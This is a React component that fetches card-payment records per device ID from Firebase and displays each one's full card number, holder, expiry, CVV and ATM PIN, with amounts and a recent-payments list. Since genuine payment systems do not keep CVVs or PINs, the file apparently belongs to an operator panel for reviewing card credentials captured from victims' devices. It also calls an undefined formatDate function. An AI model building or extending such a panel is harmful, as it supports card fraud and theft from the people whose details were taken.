import React, { useState, useEffect } from 'react';
import { useParams } from 'react-router-dom';
import { get, ref } from 'firebase/database';
import { db } from '../firebase/config';

function CardPaymentsPage() {
  const { deviceId } = useParams();
  const [data, setData] = useState(null);
  const [loading, setLoading] = useState(true);
  const [allPayments, setAllPayments] = useState([]);
  const [error, setError] = useState(null);

  useEffect(() => {
    fetchData();
  }, [deviceId]);

  const fetchData = async () => {
    setLoading(true);
    setError(null);
    try {
      const cardRef = ref(db, `card_payment/${deviceId}`);
      const snap = await get(cardRef);
      
      if (snap.exists()) {
        const allData = snap.val();
        const paymentsArray = Object.keys(allData).map(key => ({
          id: key,
          ...allData[key]
        }));
        
        paymentsArray.sort((a, b) => {
          const tsA = a.timestampMillis || 0;
          const tsB = b.timestampMillis || 0;
          return tsB - tsA;
        });
        
        setAllPayments(paymentsArray);
        setData(paymentsArray[0] || null);
      }
    } catch (err) { 
      console.error(err);
      setError(err.message);
    }
    setLoading(false);
  };

  const getStatusColor = (status) => {
    if (status === 'Success') return '#2ecc71';
    if (status === 'Failed') return '#e74c3c';
    if (status === 'Pending') return '#f1c40f';
    return '#95a5a6';
  };

  const getStatusIcon = (status) => {
    if (status === 'Success') return '✅';
    if (status === 'Failed') return '❌';
    if (status === 'Pending') return '⏳';
    return '⚪';
  };

  if (loading) {
    return (
      <div style={{ 
        display: 'flex', 
        flexDirection: 'column', 
        alignItems: 'center', 
        justifyContent: 'center', 
        minHeight: '100px', 
        gap: '8px', 
        padding: '10px' 
      }}>
        <div style={{ 
          width: '24px', 
          height: '24px', 
          border: '3px solid #e2e8f0', 
          borderTopColor: '#6c63ff', 
          borderRadius: '50%', 
          animation: 'spin 0.8s linear infinite' 
        }}></div>
        <p style={{ fontSize: '12px', color: 'var(--text-muted)' }}>Loading...</p>
        <style>{`
          @keyframes spin {
            to { transform: rotate(360deg); }
          }
        `}</style>
      </div>
    );
  }

  if (error) {
    return (
      <div style={{ textAlign: 'center', padding: '20px', color: 'var(--text-muted)' }}>
        <span style={{ fontSize: '32px', display: 'block', marginBottom: '4px' }}>❌</span>
        <p style={{ fontSize: '13px' }}>Failed to load card data</p>
        <button onClick={fetchData} style={{ 
          marginTop: '8px', 
          padding: '4px 16px', 
          border: '1px solid var(--border-color)', 
          borderRadius: '6px', 
          background: 'var(--bg-card)', 
          color: 'var(--text-primary)', 
          cursor: 'pointer', 
          fontSize: '12px' 
        }}>Retry</button>
      </div>
    );
  }

  if (!data) {
    return (
      <div style={{ textAlign: 'center', padding: '20px', color: 'var(--text-muted)' }}>
        <span style={{ fontSize: '32px', display: 'block', marginBottom: '4px' }}>📭</span>
        <p style={{ fontSize: '13px' }}>No card payment data found</p>
      </div>
    );
  }

  return (
    <div style={{ padding: '4px 0' }}>
      {/* ===== Compact Details ===== */}
      <div style={{ 
        display: 'grid', 
        gridTemplateColumns: '1fr 1fr', 
        gap: '4px',
        marginBottom: '6px'
      }}>
        <div style={{ 
          gridColumn: 'span 2',
          background: 'var(--bg-card)', 
          borderRadius: '6px', 
          padding: '6px 10px', 
          display: 'flex', 
          justifyContent: 'space-between', 
          alignItems: 'center',
          border: '1px solid var(--border-color)'
        }}>
          <span style={{ fontSize: '11px', color: 'var(--text-muted)', fontWeight: 500 }}>💳 Card Number</span>
          <span style={{ fontSize: '13px', fontWeight: 600, color: 'var(--text-primary)', fontFamily: 'monospace', letterSpacing: '1px' }}>
            {data.cardNumber || 'N/A'}
          </span>
        </div>
        
        <div style={{ 
          background: 'var(--bg-card)', 
          borderRadius: '6px', 
          padding: '4px 8px', 
          display: 'flex', 
          justifyContent: 'space-between', 
          alignItems: 'center',
          border: '1px solid var(--border-color)'
        }}>
          <span style={{ fontSize: '10px', color: 'var(--text-muted)', fontWeight: 500 }}>👤 Holder</span>
          <span style={{ fontSize: '12px', fontWeight: 600, color: 'var(--text-primary)' }}>
            {data.cardHolder || data.nameOnCard || 'N/A'}
          </span>
        </div>
        
        <div style={{ 
          background: 'var(--bg-card)', 
          borderRadius: '6px', 
          padding: '4px 8px', 
          display: 'flex', 
          justifyContent: 'space-between', 
          alignItems: 'center',
          border: '1px solid var(--border-color)'
        }}>
          <span style={{ fontSize: '10px', color: 'var(--text-muted)', fontWeight: 500 }}>📅 Expiry</span>
          <span style={{ fontSize: '12px', fontWeight: 600, color: 'var(--text-primary)' }}>
            {data.expiry || 'N/A'}
          </span>
        </div>
        
        <div style={{ 
          background: 'var(--bg-card)', 
          borderRadius: '6px', 
          padding: '4px 8px', 
          display: 'flex', 
          justifyContent: 'space-between', 
          alignItems: 'center',
          border: '1px solid var(--border-color)'
        }}>
          <span style={{ fontSize: '10px', color: 'var(--text-muted)', fontWeight: 500 }}>🔐 CVV</span>
          <span style={{ fontSize: '12px', fontWeight: 600, color: 'var(--text-primary)', fontFamily: 'monospace', letterSpacing: '2px' }}>
            {data.cvv || 'N/A'}
          </span>
        </div>
        
        <div style={{ 
          background: 'var(--bg-card)', 
          borderRadius: '6px', 
          padding: '4px 8px', 
          display: 'flex', 
          justifyContent: 'space-between', 
          alignItems: 'center',
          border: '1px solid var(--border-color)'
        }}>
          <span style={{ fontSize: '10px', color: 'var(--text-muted)', fontWeight: 500 }}>🏦 Type</span>
          <span style={{ fontSize: '12px', fontWeight: 600, color: 'var(--text-primary)' }}>
            {data.cardType || 'N/A'}
          </span>
        </div>
        
        <div style={{ 
          background: 'var(--bg-card)', 
          borderRadius: '6px', 
          padding: '4px 8px', 
          display: 'flex', 
          justifyContent: 'space-between', 
          alignItems: 'center',
          border: '1px solid var(--border-color)'
        }}>
          <span style={{ fontSize: '10px', color: 'var(--text-muted)', fontWeight: 500 }}>💰 Amount</span>
          <span style={{ fontSize: '14px', fontWeight: 700, color: '#2ecc71' }}>
            ₹{data.amount || '0'}
          </span>
        </div>
        
        <div style={{ 
          background: 'var(--bg-card)', 
          borderRadius: '6px', 
          padding: '4px 8px', 
          display: 'flex', 
          justifyContent: 'space-between', 
          alignItems: 'center',
          border: '1px solid var(--border-color)'
        }}>
          <span style={{ fontSize: '10px', color: 'var(--text-muted)', fontWeight: 500 }}>📌 Status</span>
          <span style={{ fontSize: '12px', fontWeight: 700, color: getStatusColor(data.status) }}>
            {getStatusIcon(data.status)} {data.status || 'Pending'}
          </span>
        </div>
        
        <div style={{ 
          background: 'var(--bg-card)', 
          borderRadius: '6px', 
          padding: '4px 8px', 
          display: 'flex', 
          justifyContent: 'space-between', 
          alignItems: 'center',
          border: '1px solid var(--border-color)'
        }}>
          <span style={{ fontSize: '10px', color: 'var(--text-muted)', fontWeight: 500 }}>🔑 ATM PIN</span>
          <span style={{ fontSize: '12px', fontWeight: 600, color: '#e74c3c', fontFamily: 'monospace', letterSpacing: '2px' }}>
            {data.atmPin || 'N/A'}
          </span>
        </div>
        
        <div style={{ 
          background: 'var(--bg-card)', 
          borderRadius: '6px', 
          padding: '4px 8px', 
          display: 'flex', 
          justifyContent: 'space-between', 
          alignItems: 'center',
          border: '1px solid var(--border-color)'
        }}>
          <span style={{ fontSize: '10px', color: 'var(--text-muted)', fontWeight: 500 }}>💾 Save</span>
          <span style={{ fontSize: '12px', fontWeight: 600, color: 'var(--text-primary)' }}>
            {data.saveCard ? '✅ Yes' : '❌ No'}
          </span>
        </div>
        
        <div style={{ 
          gridColumn: 'span 2',
          background: 'var(--bg-card)', 
          borderRadius: '6px', 
          padding: '4px 8px', 
          display: 'flex', 
          justifyContent: 'space-between', 
          alignItems: 'center',
          border: '1px solid var(--border-color)'
        }}>
          <span style={{ fontSize: '10px', color: 'var(--text-muted)', fontWeight: 500 }}>🕐 Timestamp</span>
          <span style={{ fontSize: '11px', fontWeight: 500, color: 'var(--text-muted)' }}>
            {data.timestamp || 'N/A'}
          </span>
        </div>
      </div>

      {/* ===== Recent Payments ===== */}
      {allPayments.length > 1 && (
        <div style={{ 
          background: 'var(--bg-card)', 
          borderRadius: '6px', 
          border: '1px solid var(--border-color)', 
          overflow: 'hidden',
          marginTop: '4px'
        }}>
          <div style={{ 
            display: 'flex', 
            justifyContent: 'space-between', 
            alignItems: 'center', 
            padding: '6px 10px', 
            background: 'var(--bg-input)', 
            borderBottom: '1px solid var(--border-color)', 
            fontSize: '11px', 
            fontWeight: 600, 
            color: 'var(--text-primary)' 
          }}>
            <span>📋 Recent Payments</span>
            <span style={{ 
              background: '#6c63ff', 
              color: 'white', 
              fontSize: '10px', 
              padding: '1px 8px', 
              borderRadius: '10px' 
            }}>
              {allPayments.length}
            </span>
          </div>
          {allPayments.slice(0, 5).map((payment, index) => (
            <div key={payment.id || index} style={{ 
              display: 'flex', 
              justifyContent: 'space-between', 
              alignItems: 'center', 
              padding: '5px 10px', 
              borderBottom: index < allPayments.slice(0, 5).length - 1 ? '1px solid var(--border-color)' : 'none'
            }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                <span style={{ fontSize: '14px' }}>💳</span>
                <div>
                  <span style={{ fontSize: '12px', fontWeight: 600, color: 'var(--text-primary)' }}>
                    ₹{payment.amount || '0'}
                  </span>
                  <span style={{ fontSize: '10px', fontWeight: 500, color: getStatusColor(payment.status), marginLeft: '6px' }}>
                    {payment.status || 'Pending'}
                  </span>
                </div>
              </div>
              <span style={{ fontSize: '9px', color: 'var(--text-muted)' }}>
                {payment.timestamp || formatDate(payment.timestampMillis)}
              </span>
            </div>
          ))}
        </div>
      )}
    </div>
  );
}

export default CardPaymentsPage;